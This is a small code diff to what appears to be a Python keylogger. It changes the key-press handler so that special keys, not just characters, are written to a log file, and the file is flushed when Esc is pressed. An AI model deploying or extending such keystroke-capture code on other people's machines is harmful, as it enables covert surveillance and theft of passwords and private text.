@@ -14,7 +14,7 @@ def on_press(key):
         else:
             file.write("{0}".format(key.char))
     except AttributeError:
-        print('Key pressed {0}'.format(key))
+        file.write(' {0} '.format(key))
 def on_release(key):
     if key == keyboard.Key.esc:
         file.flush()
